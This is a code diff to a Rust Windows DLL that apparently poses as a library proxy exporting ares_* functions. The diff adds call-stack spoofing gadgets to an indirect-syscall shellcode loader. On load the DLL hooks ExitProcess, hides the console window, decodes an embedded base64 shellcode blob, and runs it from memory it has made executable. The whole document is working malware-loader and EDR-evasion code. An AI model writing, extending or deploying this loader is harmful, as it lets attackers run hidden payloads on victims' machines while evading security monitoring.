@@ -6,7 +6,7 @@ use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
 use base64::{Engine as _, engine::general_purpose};
 
 mod syscall;
-use syscall::{get_syscall_info, get_syscall_number, get_module_base, get_export_address};
+use syscall::{get_syscall_info, get_syscall_number, get_module_base, get_export_address, get_ret_gadget};
 
 static mut ORIGINAL_EXIT_PROCESS: usize = 0;
 
@@ -19,7 +19,27 @@ asm_nt_allocate_virtual_memory:
     mov r10, rcx
     mov eax, [rsp + 0x38]
     mov r11, [rsp + 0x40]
-    jmp r11
+    mov r12, [rsp + 0x48]
+    mov r13, [rsp + 0x50]
+
+    sub rsp, 0x20          /* Shadow space for the syscall instruction if it calls back (it doesn't, but for alignment) */
+
+    /* We need to move arguments beyond the first 4 for the kernel */
+    /* Original stack: [ret] [shadow1] [shadow2] [shadow3] [shadow4] [arg5] [arg6] [id] [inst] [g1] [g2] */
+    /* We are pushing g2 and g1, so stack moves by 16. arg5 and arg6 must be at [rsp + 0x28] and [rsp + 0x30] for kernel */
+    /* Kernel expectations for NtAllocate: Handle(rcx), Base(rdx), Zero(r8), Size(r9), Type([rsp+28]), Protect([rsp+30]) */
+
+    mov r14, [rsp + 0x20 + 0x28] /* original arg5 (AllocationType) */
+    mov r15, [rsp + 0x20 + 0x30] /* original arg6 (Protect) */
+
+    push r13                /* Push gadget2 */
+    push r12                /* Push gadget1 */
+
+    /* Now RSP has shifted by 16. We need arg5 and arg6 at [rsp + 0x28] and [rsp + 0x30] */
+    mov [rsp + 0x28], r14
+    mov [rsp + 0x30], r15
+
+    jmp r11                 /* Jump to syscall instruction */
 
 .global asm_nt_protect_virtual_memory
 asm_nt_protect_virtual_memory:
@@ -29,6 +49,18 @@ asm_nt_protect_virtual_memory:
     mov r10, rcx
     mov eax, [rsp + 0x30]
     mov r11, [rsp + 0x38]
+    mov r12, [rsp + 0x40]
+    mov r13, [rsp + 0x48]
+
+    sub rsp, 0x20
+
+    mov r14, [rsp + 0x20 + 0x28] /* original arg5 (OldAccessProtection) */
+
+    push r13
+    push r12
+
+    mov [rsp + 0x28], r14
+
     jmp r11
 
 .global asm_nt_write_virtual_memory
@@ -39,6 +71,18 @@ asm_nt_write_virtual_memory:
     mov r10, rcx
     mov eax, [rsp + 0x30]
     mov r11, [rsp + 0x38]
+    mov r12, [rsp + 0x40]
+    mov r13, [rsp + 0x48]
+
+    sub rsp, 0x20
+
+    mov r14, [rsp + 0x20 + 0x28] /* original arg5 (NumberOfBytesWritten) */
+
+    push r13
+    push r12
+
+    mov [rsp + 0x28], r14
+
     jmp r11
 
 .global asm_nt_create_thread_ex
@@ -49,6 +93,52 @@ asm_nt_create_thread_ex:
     mov r10, rcx
     mov eax, [rsp + 0x60]
     mov r11, [rsp + 0x68]
+    mov r12, [rsp + 0x70]
+    mov r13, [rsp + 0x78]
+
+    sub rsp, 0x50           /* Large shift to handle many stack args */
+
+    /* original stack args start at [rsp + 0x50 + 0x28] (shadow + ret) */
+    mov rax, [rsp + 0x50 + 0x28] /* arg5 */
+    mov [rsp + 0x28], rax
+    mov rax, [rsp + 0x50 + 0x30] /* arg6 */
+    mov [rsp + 0x30], rax
+    mov rax, [rsp + 0x50 + 0x38] /* arg7 */
+    mov [rsp + 0x38], rax
+    mov rax, [rsp + 0x50 + 0x40] /* arg8 */
+    mov [rsp + 0x40], rax
+    mov rax, [rsp + 0x50 + 0x48] /* arg9 */
+    mov [rsp + 0x48], rax
+    mov rax, [rsp + 0x50 + 0x50] /* arg10 */
+    mov [rsp + 0x50], rax
+    mov rax, [rsp + 0x50 + 0x58] /* arg11 */
+    mov [rsp + 0x58], rax
+
+    /* Now eax is lost, reload it from original pos relative to NEW rsp */
+    mov eax, [rsp + 0x50 + 0x60]
+
+    push r13
+    push r12
+
+    /* Final RSP relative to pushed gadgets */
+    /* Stack args for kernel are at [rsp + 0x28]... */
+    /* We shifted rsp by another 16, so we need to fix the args we just moved */
+
+    mov rax, [rsp + 0x28 + 0x10]
+    mov [rsp + 0x28], rax
+    mov rax, [rsp + 0x30 + 0x10]
+    mov [rsp + 0x30], rax
+    mov rax, [rsp + 0x38 + 0x10]
+    mov [rsp + 0x38], rax
+    mov rax, [rsp + 0x40 + 0x10]
+    mov [rsp + 0x40], rax
+    mov rax, [rsp + 0x48 + 0x10]
+    mov [rsp + 0x48], rax
+    mov rax, [rsp + 0x50 + 0x10]
+    mov [rsp + 0x50], rax
+    mov rax, [rsp + 0x58 + 0x10]
+    mov [rsp + 0x58], rax
+
     jmp r11
 
 .global asm_nt_create_event
@@ -59,6 +149,18 @@ asm_nt_create_event:
     mov r10, rcx
     mov eax, [rsp + 0x30]
     mov r11, [rsp + 0x38]
+    mov r12, [rsp + 0x40]
+    mov r13, [rsp + 0x48]
+
+    sub rsp, 0x20
+
+    mov r14, [rsp + 0x20 + 0x28] /* original arg5 (InitialState) */
+
+    push r13
+    push r12
+
+    mov [rsp + 0x28], r14
+
     jmp r11
 
 .global asm_nt_wait_for_single_object
@@ -67,8 +169,14 @@ asm_nt_wait_for_single_object:
     mov [rsp + 0x18], r8
     mov [rsp + 0x20], r9
     mov r10, rcx
-    mov eax, [rsp + 0x20]
+    mov eax, r9d
     mov r11, [rsp + 0x28]
+    mov r12, [rsp + 0x30]
+    mov r13, [rsp + 0x38]
+
+    push r13
+    push r12
+
     jmp r11
 
 .global asm_nt_user_show_window
@@ -77,8 +185,14 @@ asm_nt_user_show_window:
     mov [rsp + 0x18], r8
     mov [rsp + 0x20], r9
     mov r10, rcx
-    mov eax, [rsp + 0x18]
+    mov eax, r8d
     mov r11, [rsp + 0x20]
+    mov r12, [rsp + 0x28]
+    mov r13, [rsp + 0x30]
+
+    push r13
+    push r12
+
     jmp r11
 "#);
 
@@ -92,6 +206,8 @@ extern "C" {
         Protect: u32,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 
     fn asm_nt_protect_virtual_memory(
@@ -102,6 +218,8 @@ extern "C" {
         OldAccessProtection: &mut u32,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 
     fn asm_nt_write_virtual_memory(
@@ -112,6 +230,8 @@ extern "C" {
         NumberOfBytesWritten: &mut usize,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 
     fn asm_nt_create_thread_ex(
@@ -128,6 +248,8 @@ extern "C" {
         AttributeList: *mut std::ffi::c_void,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 
     fn asm_nt_create_event(
@@ -138,6 +260,8 @@ extern "C" {
         InitialState: u8,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 
     fn asm_nt_wait_for_single_object(
@@ -146,6 +270,8 @@ extern "C" {
         Timeout: *mut i64,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 
     fn asm_nt_user_show_window(
@@ -153,6 +279,8 @@ extern "C" {
         n_cmd_show: u32,
         syscall_id: u32,
         syscall_inst: *mut std::ffi::c_void,
+        gadget1: *mut std::ffi::c_void,
+        gadget2: *mut std::ffi::c_void,
     ) -> windows::Win32::Foundation::BOOL;
 }
 
@@ -473,12 +601,15 @@ export_function!(ares_tolower);
 export_function!(ares_version);
 
 unsafe fn hook_exit_process() {
-    if let (Some(kernel32_base), Some((nt_protect_id, nt_protect_inst)), Some((nt_write_id, nt_write_inst))) = (
+    if let (Some(kernel32_base), Some((nt_protect_id, nt_protect_inst, ntdll_ret)), Some((nt_write_id, nt_write_inst, _))) = (
         get_module_base("kernel32.dll"),
         get_syscall_info("NtProtectVirtualMemory"),
         get_syscall_info("NtWriteVirtualMemory"),
     ) {
-        if let Some(exit_proc_addr) = get_export_address(kernel32_base, "ExitProcess") {
+        if let (Some(exit_proc_addr), Some(kernel32_ret)) = (
+            get_export_address(kernel32_base, "ExitProcess"),
+            get_ret_gadget("kernel32.dll"),
+        ) {
             let exit_proc_ptr = exit_proc_addr as *mut u8;
             ORIGINAL_EXIT_PROCESS = exit_proc_ptr as usize;
 
@@ -494,6 +625,8 @@ unsafe fn hook_exit_process() {
                 &mut old_protect,
                 nt_protect_id,
                 nt_protect_inst,
+                ntdll_ret,
+                kernel32_ret,
             );
 
             let hook_addr = fake_exit_process as usize;
@@ -519,6 +652,8 @@ unsafe fn hook_exit_process() {
                 &mut bytes_written,
                 nt_write_id,
                 nt_write_inst,
+                ntdll_ret,
+                kernel32_ret,
             );
 
             asm_nt_protect_virtual_memory(
@@ -529,35 +664,43 @@ unsafe fn hook_exit_process() {
                 &mut old_protect,
                 nt_protect_id,
                 nt_protect_inst,
+                ntdll_ret,
+                kernel32_ret,
             );
         }
     }
 }
 
 unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
-    if let (Some((nt_create_event_id, nt_create_event_inst)), Some((nt_wait_id, nt_wait_inst))) = (
+    if let (Some((nt_create_event_id, nt_create_event_inst, ntdll_ret)), Some((nt_wait_id, nt_wait_inst, _))) = (
         get_syscall_info("NtCreateEvent"),
         get_syscall_info("NtWaitForSingleObject"),
     ) {
-        let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
-        asm_nt_create_event(
-            &mut event_handle,
-            0x1F0003, // EVENT_ALL_ACCESS
-            std::ptr::null_mut(),
-            1, // NotificationEvent
-            0, // Not signaled
-            nt_create_event_id,
-            nt_create_event_inst,
-        );
-
-        if event_handle != 0 {
-            asm_nt_wait_for_single_object(
-                event_handle,
-                0,
-                std::ptr::null_mut(), // INFINITE
-                nt_wait_id,
-                nt_wait_inst,
+        if let Some(kernel32_ret) = get_ret_gadget("kernel32.dll") {
+            let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+            asm_nt_create_event(
+                &mut event_handle,
+                0x1F0003, // EVENT_ALL_ACCESS
+                std::ptr::null_mut(),
+                1, // NotificationEvent
+                0, // Not signaled
+                nt_create_event_id,
+                nt_create_event_inst,
+                ntdll_ret,
+                kernel32_ret,
             );
+
+            if event_handle != 0 {
+                asm_nt_wait_for_single_object(
+                    event_handle,
+                    0,
+                    std::ptr::null_mut(), // INFINITE
+                    nt_wait_id,
+                    nt_wait_inst,
+                    ntdll_ret,
+                    kernel32_ret,
+                );
+            }
         }
     }
     loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
@@ -567,52 +710,60 @@ const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1I
 
 unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
     if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
-        if let (Some((nt_alloc_id, nt_alloc_inst)), Some((nt_write_id, nt_write_inst)), Some((nt_protect_id, nt_protect_inst))) = (
+        if let (Some((nt_alloc_id, nt_alloc_inst, ntdll_ret)), Some((nt_write_id, nt_write_inst, _)), Some((nt_protect_id, nt_protect_inst, _))) = (
             get_syscall_info("NtAllocateVirtualMemory"),
             get_syscall_info("NtWriteVirtualMemory"),
             get_syscall_info("NtProtectVirtualMemory"),
         ) {
-            let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
-            let mut region_size = shellcode.len();
+            if let Some(kernel32_ret) = get_ret_gadget("kernel32.dll") {
+                let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+                let mut region_size = shellcode.len();
 
-            let status = asm_nt_allocate_virtual_memory(
-                -1isize as windows_sys::Win32::Foundation::HANDLE,
-                &mut exec_mem,
-                0,
-                &mut region_size,
-                0x3000, // MEM_COMMIT | MEM_RESERVE
-                0x04,   // PAGE_READWRITE
-                nt_alloc_id,
-                nt_alloc_inst,
-            );
-
-            if status == 0 && !exec_mem.is_null() {
-                let mut bytes_written = 0usize;
-                asm_nt_write_virtual_memory(
+                let status = asm_nt_allocate_virtual_memory(
                     -1isize as windows_sys::Win32::Foundation::HANDLE,
-                    exec_mem,
-                    shellcode.as_ptr() as *const std::ffi::c_void,
-                    shellcode.len(),
-                    &mut bytes_written,
-                    nt_write_id,
-                    nt_write_inst,
+                    &mut exec_mem,
+                    0,
+                    &mut region_size,
+                    0x3000, // MEM_COMMIT | MEM_RESERVE
+                    0x04,   // PAGE_READWRITE
+                    nt_alloc_id,
+                    nt_alloc_inst,
+                    ntdll_ret,
+                    kernel32_ret,
                 );
 
-                let mut old_protect = 0u32;
-                let mut protect_size = shellcode.len();
-                let mut protect_base = exec_mem;
-                asm_nt_protect_virtual_memory(
-                    -1isize as windows_sys::Win32::Foundation::HANDLE,
-                    &mut protect_base,
-                    &mut protect_size,
-                    0x20, // PAGE_EXECUTE_READ
-                    &mut old_protect,
-                    nt_protect_id,
-                    nt_protect_inst,
-                );
+                if status == 0 && !exec_mem.is_null() {
+                    let mut bytes_written = 0usize;
+                    asm_nt_write_virtual_memory(
+                        -1isize as windows_sys::Win32::Foundation::HANDLE,
+                        exec_mem,
+                        shellcode.as_ptr() as *const std::ffi::c_void,
+                        shellcode.len(),
+                        &mut bytes_written,
+                        nt_write_id,
+                        nt_write_inst,
+                        ntdll_ret,
+                        kernel32_ret,
+                    );
 
-                let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
-                exec_fn();
+                    let mut old_protect = 0u32;
+                    let mut protect_size = shellcode.len();
+                    let mut protect_base = exec_mem;
+                    asm_nt_protect_virtual_memory(
+                        -1isize as windows_sys::Win32::Foundation::HANDLE,
+                        &mut protect_base,
+                        &mut protect_size,
+                        0x20, // PAGE_EXECUTE_READ
+                        &mut old_protect,
+                        nt_protect_id,
+                        nt_protect_inst,
+                        ntdll_ret,
+                        kernel32_ret,
+                    );
+
+                    let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
+                    exec_fn();
+                }
             }
         }
     }
@@ -626,12 +777,12 @@ unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 
                 let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
                 let hwnd = get_console_window();
                 if hwnd.0 != 0 {
-                    if let Some(nt_show_window_id) = get_syscall_number("win32u.dll", "NtUserShowWindow") {
-                        // For NtUserShowWindow, we don't have a reliable gadget search yet, so we use direct for now
-                        // (Win32u syscalls are usually consistent enough)
-                        // But let's find a generic ntdll syscall gadget for all of them
-                        if let Some((_, syscall_inst)) = get_syscall_info("NtAllocateVirtualMemory") {
-                             asm_nt_user_show_window(hwnd, 0, nt_show_window_id, syscall_inst); // SW_HIDE = 0
+                    if let (Some(nt_show_window_id), Some((_, syscall_inst, ntdll_ret))) = (
+                        get_syscall_number("win32u.dll", "NtUserShowWindow"),
+                        get_syscall_info("NtAllocateVirtualMemory"),
+                    ) {
+                        if let Some(kernel32_ret) = get_ret_gadget("kernel32.dll") {
+                             asm_nt_user_show_window(hwnd, 0, nt_show_window_id, syscall_inst, ntdll_ret, kernel32_ret); // SW_HIDE = 0
                              break;
                         }
                     }
@@ -653,7 +804,10 @@ pub extern "system" fn DllMain(
         unsafe {
             hook_exit_process();
 
-            if let Some((nt_create_thread_id, nt_create_thread_inst)) = get_syscall_info("NtCreateThreadEx") {
+            if let (Some((nt_create_thread_id, nt_create_thread_inst, ntdll_ret)), Some(kernel32_ret)) = (
+                get_syscall_info("NtCreateThreadEx"),
+                get_ret_gadget("kernel32.dll"),
+            ) {
                 let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
 
                 // Spawn console hider thread
@@ -668,6 +822,8 @@ pub extern "system" fn DllMain(
                     std::ptr::null_mut(),
                     nt_create_thread_id,
                     nt_create_thread_inst,
+                    ntdll_ret,
+                    kernel32_ret,
                 );
 
                 // Spawn shellcode thread
@@ -682,6 +838,8 @@ pub extern "system" fn DllMain(
                     std::ptr::null_mut(),
                     nt_create_thread_id,
                     nt_create_thread_inst,
+                    ntdll_ret,
+                    kernel32_ret,
                 );
             }
         }
